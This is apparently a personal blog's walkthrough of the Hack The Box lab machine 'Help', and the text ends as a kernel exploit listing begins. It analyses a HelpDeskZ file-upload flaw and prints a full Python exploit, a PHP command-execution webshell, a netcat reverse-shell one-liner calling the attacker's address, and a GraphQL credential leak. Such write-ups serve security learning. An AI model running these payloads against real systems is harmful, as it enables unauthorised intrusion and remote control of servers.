<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Hack The Box - Help | 0xRick</title>
<meta name="generator" content="Jekyll v3.8.5" />
<meta property="og:title" content="Hack The Box - Help" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="My write-up / walkthrough for Help from Hack The Box." />
<meta property="og:description" content="My write-up / walkthrough for Help from Hack The Box." />
<link rel="canonical" href="https://0xrick.github.io/hack-the-box/help/" />
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/help/" />
<meta property="og:site_name" content="0xRick" />
<meta property="og:image" content="https://0xrick.github.io/hackthebox/help/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-06-08T00:00:00+02:00" />
<script type="application/ld+json">
{"description":"My write-up / walkthrough for Help from Hack The Box.","@type":"BlogPosting","url":"https://0xrick.github.io/hack-the-box/help/","image":"https://0xrick.github.io/hackthebox/help/0.png","headline":"Hack The Box - Help","dateModified":"2019-06-08T00:00:00+02:00","datePublished":"2019-06-08T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xrick.github.io/hack-the-box/help/"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://0xrick.github.io/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
</head><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-twitter"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-facebook"></i></a><a class="color-purple-hover" href="https://github.com/0xRick" target="_blank" rel="noopener noreferrer"><i class="fab fa-github"></i></a><a class="color-orange-hover" href="https://www.reddit.com/user/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer"><i class="fab fa-reddit"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/332196573771595777" target="_blank" rel="noopener noreferrer"><i class="fab fa-discord"></i></a>
        <a class="color-red-hover" href="mailto:x0rick@protonmail.com"><i class="fa fa-envelope"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="author-box">
<img src="/avatar.png" class="author-avatar" onclick="window.open('https://www.hackthebox.eu/profile/65598','_blank');">
<h7>
	Ahmed Hesham<br>
	CyberSec/InfoSec enthusiast. <br>
	Interested in knowing how things work/Interested in breaking them, always learning.
</h7>
</div>

  <br>
<div>
	<h7>    Ad </h7>
	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script>
</div>
<div class="post">
  <h1 class="post-title">Hack The Box - Help</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/linux/">linux</a>
      
      <a class="tag" href="/tag/web/">web</a>
      
      <a class="tag" href="/tag/rce/">rce</a>
      
      <a class="tag" href="/tag/php/">php</a>
      
      <a class="tag" href="/tag/python/">python</a>
      
      <a class="tag" href="/tag/code-analysis/">code-analysis</a>
      
  </div>
  
  <div class="post-date">Published on 08 Jun 2019</div>
  
  <div class="post-description">My write-up / walkthrough for Help from Hack The Box.</div>
  
  <hr>

<h2 id="quick-summary">Quick Summary</h2>
<p><br> Hey guys today Help retired and here’s my write-up about it. Help was a nice easy machine, I don’t really have much to say about it. To get an initial shell on the box we will exploit a non-authenticated file upload vulnerability in a web application called <code class="highlighter-rouge">HelpDeskZ</code>. This vulnerability could be exploited in two ways either by editing the exploit to include a higher range or by getting credentials to the web app and editing some settings to make the exploit work. After getting a shell the privilege escalation part is just a kernel exploit. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.121</code> I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">help.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/help/0.png" alt=""><br></p>
<hr>

<h2 id="nmap">Nmap</h2>
<p><br> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
<br><code class="highlighter-rouge">nmap -sV -sT -sC help.htb</code>
<br><img src="/images/hackthebox/help/1.png" alt=""><br>
<br> We got <code class="highlighter-rouge">ssh</code> on port 22 and <code class="highlighter-rouge">http</code> on two ports : 80 and 3000. What’s running on port 80 is an <code class="highlighter-rouge">Apache2</code> server and on port 3000 is <code class="highlighter-rouge">Node.js Express Framework</code>.
<br></p>
<hr>

<h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
<p><br> On port 80 there’s just the default <code class="highlighter-rouge">Apache</code> index page :
<br><img src="/images/hackthebox/help/2.png" alt=""><br>
<br> So I ran <code class="highlighter-rouge">gobuster</code> and got these results :
<br><code class="highlighter-rouge">gobuster -u http://help.htb/ -w /usr/share/wordlists/dirb/common.txt</code></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://help.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/06/07 13:03:25 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/javascript (Status: 301)
/server-status (Status: 403)
/support (Status: 301)
=====================================================
2019/06/07 13:05:25 Finished
=====================================================
</code></pre></div></div>
<p><br> I went to <code class="highlighter-rouge">/support</code> and there was a web application called <code class="highlighter-rouge">HelpDeskZ</code> :
<br><img src="/images/hackthebox/help/3.png" alt=""><br></p>
<hr>

<h2 id="file-upload-vulnerability">File Upload Vulnerability</h2>
<p><br> A quick search and I found an <a href="https://www.exploit-db.com/exploits/40300" target="_blank" rel="noopener noreferrer">unauthenticated file upload vulnerability</a> that takes advantage of the weak file renaming function that’s responsible for renaming tickets attachments and the ability to upload <code class="highlighter-rouge">php</code> files because they are allowed by default.</p>

<blockquote>
  <p>HelpDeskZ = v1.0.2 suffers from an unauthenticated shell upload vulnerability.
The software in the default configuration allows upload for .php-Files ( !! ). I think the developers thought it was no risk, because the filenames get obfuscated when they are uploaded. However, there is a weakness in the rename function of the uploaded file. -<a href="https://www.exploit-db.com/exploits/40300" target="_blank" rel="noopener noreferrer">exploit-db</a></p>
</blockquote>

<p><br> I wanted to test if I can really upload <code class="highlighter-rouge">php</code> so I went to <code class="highlighter-rouge">Submit a Ticket</code> and I attached a test file :
<br><img src="/images/hackthebox/help/4.png" alt=""><br>
<br><img src="/images/hackthebox/help/5.png" alt=""><br>
<br><img src="/images/hackthebox/help/6.png" alt=""><br>
<br> And I got <code class="highlighter-rouge">File is not allowed.</code>
<br> Luckily <code class="highlighter-rouge">HelpDeskZ</code> is an open-source application so I checked the source on <a href="https://github.com/evolutionscript/HelpDeskZ-1.0" target="_blank" rel="noopener noreferrer">github</a>. 
<br> The script that handles tickets submissions is called <a href="https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/parser/new_ticket.php" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">new-ticket.php</code></a>. It can be found in <code class="highlighter-rouge">includes/parser</code>. 
<br> Here’s the part for the attachments :
<br><img src="/images/hackthebox/help/7.png" alt=""><br></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$attachments</span><span class="p">)){</span>
		<span class="nv">$save_dir</span> <span class="o">=</span> <span class="nx">UPLOAD_DIR</span><span class="p">;</span>
		<span class="k">foreach</span><span class="p">(</span><span class="nv">$attachments</span> <span class="k">as</span> <span class="nv">$attachment</span><span class="p">)</span> <span class="p">{</span>
		  <span class="c1">// get the attachment name
</span>		  <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$attachment</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">;</span>
		  <span class="c1">// write the file to the directory you want to save it in
</span>		  <span class="k">if</span> <span class="p">(</span><span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$save_dir</span><span class="o">.</span><span class="nv">$filename</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">))</span> <span class="p">{</span>
			<span class="k">while</span><span class="p">(</span><span class="nv">$bytes</span> <span class="o">=</span> <span class="nv">$attachment</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">())</span> <span class="p">{</span>
			  <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">);</span>
			<span class="p">}</span>
			<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
		  <span class="p">}</span>
			
		  <span class="nv">$filesize</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nx">UPLOAD_DIR</span><span class="o">.</span><span class="nv">$filename</span><span class="p">);</span>
		  <span class="k">if</span><span class="p">(</span><span class="nv">$filesize</span><span class="p">){</span>
			  <span class="nv">$fileinfo</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="nv">$filename</span><span class="p">,</span> <span class="s1">'size'</span> <span class="o">=&gt;</span> <span class="nv">$filesize</span><span class="p">);</span>
			  <span class="nv">$fileverification</span> <span class="o">=</span> <span class="nx">verifyAttachment</span><span class="p">(</span><span class="nv">$fileinfo</span><span class="p">);</span>
			  <span class="k">if</span><span class="p">(</span><span class="nv">$fileverification</span><span class="p">[</span><span class="s1">'msg_code'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
				<span class="nv">$ext</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">);</span>
				<span class="nv">$filename_encoded</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$filename</span><span class="o">.</span><span class="nb">time</span><span class="p">())</span><span class="o">.</span><span class="s2">"."</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>
				<span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="nv">$filename</span><span class="p">,</span> <span class="s1">'enc'</span> <span class="o">=&gt;</span> <span class="nv">$filename_encoded</span><span class="p">,</span> <span class="s1">'filesize'</span> <span class="o">=&gt;</span> <span class="nv">$filesize</span><span class="p">,</span> <span class="s1">'ticket_id'</span> <span class="o">=&gt;</span> <span class="nv">$ticketid</span><span class="p">,</span> <span class="s1">'msg_id'</span> <span class="o">=&gt;</span> <span class="nv">$message_id</span><span class="p">,</span> <span class="s1">'filetype'</span> <span class="o">=&gt;</span> <span class="nv">$attachment</span><span class="o">-&gt;</span><span class="na">content_type</span><span class="p">);</span>
				<span class="nv">$db</span><span class="o">-&gt;</span><span class="na">insert</span><span class="p">(</span><span class="nx">TABLE_PREFIX</span><span class="o">.</span><span class="s2">"attachments"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
				<span class="nb">rename</span><span class="p">(</span><span class="nx">UPLOAD_DIR</span><span class="o">.</span><span class="nv">$filename</span><span class="p">,</span> <span class="nx">UPLOAD_DIR</span><span class="o">.</span><span class="s1">'tickets/'</span><span class="o">.</span><span class="nv">$filename_encoded</span><span class="p">);</span>
			  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
				<span class="nb">unlink</span><span class="p">(</span><span class="nx">UPLOAD_DIR</span><span class="o">.</span><span class="nv">$filename</span><span class="p">);</span>
			  <span class="p">}</span>
		  <span class="p">}</span>
		<span class="p">}</span>
</code></pre></div></div>
<p><br> It takes the file and uploads it then there’s an <code class="highlighter-rouge">if</code> statement that checks the result of passing <code class="highlighter-rouge">$fileinfo</code> to a function called <code class="highlighter-rouge">verifyAttachment</code>. If the function returned <code class="highlighter-rouge">0</code> it will rename the file. If it’s not <code class="highlighter-rouge">0</code> it will delete the file (<code class="highlighter-rouge">unlink(UPLOAD_DIR.$filename)</code>) . This function can be found in <a href="https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/functions.php" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">functions.php</code></a> in <code class="highlighter-rouge">includes/</code>. 
<code class="highlighter-rouge">verifyAttachment()</code> :
<br><img src="/images/hackthebox/help/8.png" alt=""><br></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="nf">verifyAttachment</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
	<span class="k">global</span> <span class="nv">$db</span><span class="p">;</span>	
	<span class="nv">$namepart</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]);</span>
	<span class="nv">$totalparts</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$namepart</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="nv">$file_extension</span> <span class="o">=</span> <span class="nv">$namepart</span><span class="p">[</span><span class="nv">$totalparts</span><span class="p">];</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">ctype_alnum</span><span class="p">(</span><span class="nv">$file_extension</span><span class="p">)){</span>
		<span class="nv">$msg_code</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
		<span class="nv">$filetype</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetchRow</span><span class="p">(</span><span class="s2">"SELECT count(id) AS total, size FROM "</span><span class="o">.</span><span class="nx">TABLE_PREFIX</span><span class="o">.</span><span class="s2">"file_types WHERE type='"</span><span class="o">.</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">real_escape_string</span><span class="p">(</span><span class="nv">$file_extension</span><span class="p">)</span><span class="o">.</span><span class="s2">"'"</span><span class="p">);</span>
		<span class="k">if</span><span class="p">(</span><span class="nv">$filetype</span><span class="p">[</span><span class="s1">'total'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
			<span class="nv">$msg_code</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
		<span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nv">$filename</span><span class="p">[</span><span class="s1">'size'</span><span class="p">]</span> <span class="o">&gt;</span> <span class="nv">$filetype</span><span class="p">[</span><span class="s1">'size'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$filetype</span><span class="p">[</span><span class="s1">'size'</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
			<span class="nv">$msg_code</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
			<span class="nv">$misc</span> <span class="o">=</span> <span class="nx">formatBytes</span><span class="p">(</span><span class="nv">$filetype</span><span class="p">[</span><span class="s1">'size'</span><span class="p">]);</span>
		<span class="p">}</span><span class="k">else</span><span class="p">{</span>	
			<span class="nv">$msg_code</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'msg_code'</span> <span class="o">=&gt;</span> <span class="nv">$msg_code</span><span class="p">,</span> <span class="s1">'msg_extra'</span> <span class="o">=&gt;</span> <span class="nv">$misc</span><span class="p">);</span>
	<span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p><br> This function runs several checks on the file, but interestingly it doesn’t check for allowed file extensions. This means that if the file passed these checks the function will return <code class="highlighter-rouge">0</code> and the file will be renamed and successfully uploaded no matter what’s the extension of that file and the message that says : <code class="highlighter-rouge">File is not allowed.</code> is meaningless. 
<br> If we take a look at how the application renames files it gets the md5 hash of the filename concatenated with the time of upload then it concatenates that hash with the original file extension. And that’s how the exploit finds the uploaded file. But there’s a small problem about time, running the exploit on our box would use our local time. If the timezone of the web app is different from the timezone of our box the exploit will fail to find the file because it will use a wrong time. 
<br> If we take a look at the exploit :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="k">print</span> <span class="s">'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"Usage: {} [baseUrl] [nameOfUploadedFile]"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">helpdeskzBaseUrl</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">fileName</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="n">currentTime</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>

<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">300</span><span class="p">):</span>
    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">fileName</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">currentTime</span> <span class="o">-</span> <span class="n">x</span><span class="p">)</span>
    <span class="n">md5hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

    <span class="n">url</span> <span class="o">=</span> <span class="n">helpdeskzBaseUrl</span><span class="o">+</span><span class="n">md5hash</span><span class="o">+</span><span class="s">'.php'</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">head</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">"found!"</span>
        <span class="k">print</span> <span class="n">url</span>
        <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="k">print</span> <span class="s">"Sorry, I did not find anything"</span>
</code></pre></div></div>
<p><br> We can solve this problem by iterating over a higher range than 300 : <code class="highlighter-rouge">for x in range(0, 300)</code>
<br> This will make it try different hashes according to different times until it finds the file, you can call it a bruteforce attack. That will be easy let’s look at another solution. Another solution is to get credentials to login to the web app and edit the timezone in the settings to make it the same as ours. 
<br></p>
<hr>

<h2 id="nodejs-getting-credentials">Node.js, Getting Credentials</h2>
<p><br> We saw earlier that port 3000 was open and running <code class="highlighter-rouge">Node.js Express framework</code> and we haven’t looked at that yet. 
<br><img src="/images/hackthebox/help/9.png" alt=""><br>
<br> By going to <code class="highlighter-rouge">http://help.htb:3000/</code> I got this response of a message saying : <code class="highlighter-rouge">"Hi Shiv, To get access please find the credentials with given query"</code>, I tried <code class="highlighter-rouge">/test</code> and got this :
<br><img src="/images/hackthebox/help/10.png" alt=""><br>
<br> tbh the next step involved a lot of guessing/fuzzing with custom wordlists and random things based on google searches about <code class="highlighter-rouge">node.js</code>, <code class="highlighter-rouge">node.js</code> queries and other related stuff. After a lot of attempts to find something when I tried <code class="highlighter-rouge">/graphql</code> I got this response :
<br><img src="/images/hackthebox/help/11.png" alt=""><br>
<br> So I added <code class="highlighter-rouge">?query</code> and got a syntax error :
<br><code class="highlighter-rouge">http://help.htb:3000/graphql?query</code>
<br><img src="/images/hackthebox/help/12.png" alt=""><br>
<br> That’s fine, I tried requesting a query, for example <code class="highlighter-rouge">user</code> :
<br><code class="highlighter-rouge">http://help.htb:3000/graphql?query={user}</code> :
<br><img src="/images/hackthebox/help/13.png" alt=""><br>
<br> It says that <code class="highlighter-rouge">user</code> must have a selection of subfields so I tried <code class="highlighter-rouge">username</code> :
<br><code class="highlighter-rouge">http://help.htb:3000/graphql?query={user{username}}</code> :
<br><img src="/images/hackthebox/help/14.png" alt=""><br>
<br> Great, let’s get the password : 
<br><code class="highlighter-rouge">http://help.htb:3000/graphql?query={user{password}}</code> :
<br><img src="/images/hackthebox/help/15.png" alt=""><br>
<br> I used <a href="https://crackstation.net/" target="_blank" rel="noopener noreferrer">crackstation</a> to crack the hash and got this password : 
<br><code class="highlighter-rouge">5d3c93182bb20f07b994a7f617e99cff</code> : <code class="highlighter-rouge">godhelpmeplz</code>
<br> Now we have the credentials : <code class="highlighter-rouge">helpme@helpme.com : godhelpmeplz</code>
<br></p>
<hr>

<h2 id="file-upload-exploitation-reverse-shell-and-user-flag">File Upload Exploitation, Reverse Shell and User Flag</h2>
<p><br> I edited the path of the uploads in the exploit, instead of <code class="highlighter-rouge">helpdeskzBaseUrl+md5hash+'.php'</code> I made it :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">helpdeskzBaseUrl</span><span class="o">+</span><span class="s">'/uploads/tickets/'</span><span class="o">+</span><span class="n">md5hash</span><span class="o">+</span><span class="s">'.php'</span>
</code></pre></div></div>
<p><br>I got that path from the <a href="https://github.com/evolutionscript/HelpDeskZ-1.0" target="_blank" rel="noopener noreferrer">github repository</a>).
<br>Exploit after edits :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="k">print</span> <span class="s">'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"Usage: {} [baseUrl] [nameOfUploadedFile]"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">helpdeskzBaseUrl</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">fileName</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="n">currentTime</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>

<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">300</span><span class="p">):</span>
    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">fileName</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">currentTime</span> <span class="o">-</span> <span class="n">x</span><span class="p">)</span>
    <span class="n">md5hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

    <span class="n">url</span> <span class="o">=</span> <span class="n">helpdeskzBaseUrl</span><span class="o">+</span><span class="s">'/uploads/tickets/'</span><span class="o">+</span><span class="n">md5hash</span><span class="o">+</span><span class="s">'.php'</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">head</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">"found!"</span>
        <span class="k">print</span> <span class="n">url</span>
        <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="k">print</span> <span class="s">"Sorry, I did not find anything"</span>
</code></pre></div></div>
<p><br> I went to the settings and changed the timezone to the same timezone as mine :
<br><img src="/images/hackthebox/help/16.png" alt=""><br>
<br> The <code class="highlighter-rouge">php</code> file I’m going to upload is <code class="highlighter-rouge">simple-backdoor.php</code> which can be found in <code class="highlighter-rouge">/usr/share/webshells/php/simple-backdoor.php</code> in <code class="highlighter-rouge">kali</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;</span>

<span class="cp">&lt;?php</span>

<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])){</span>
        <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span>
        <span class="nv">$cmd</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
        <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
        <span class="k">die</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<span class="c">&lt;!--    http://michaeldaw.org   2006    --&gt;</span>
</code></pre></div></div>
<p><br> I submitted the ticket :
<br><img src="/images/hackthebox/help/17.png" alt=""><br>
<br> Then I ran the exploit and it found the file immediately :
<br><code class="highlighter-rouge">python exploit.py http://10.10.10.121/support/ rick.php</code>
<br><img src="/images/hackthebox/help/18.png" alt=""></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php
</code></pre></div></div>
<p><br><img src="/images/hackthebox/help/19.png" alt=""></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd=whoami
</code></pre></div></div>
<p><img src="/images/hackthebox/help/20.png" alt=""><br>
<br> It’s working, let’s get a reverse shell, I used this payload (url encoded) :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff
</code></pre></div></div>
<p><img src="/images/hackthebox/help/21.png" alt=""><br>
<br><img src="/images/hackthebox/help/22.png" alt=""><br>
<br> We owned user.
<br></p>
<hr>

<h2 id="kernel-exploit-privilege-escalation-and-root-flag">Kernel Exploit, Privilege Escalation and Root Flag</h2>
<p><br> Privilege escalation on this machine was very easy, just a kernel exploit. One of the first things to check after getting a shell is the system info :
<br><code class="highlighter-rouge">uname -a</code>
<br><img src="/images/hackthebox/help/23.png" alt=""><br>
<br> That kernel version is vulnerable to a local privilege escalation vulnerability and there’s an <a href="https://www.exploit-db.com/exploits/44298" target="_blank" rel="noopener noreferrer">exploit</a> published for it.
<br><code class="highlighter-rouge">exploit.c</code> :</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
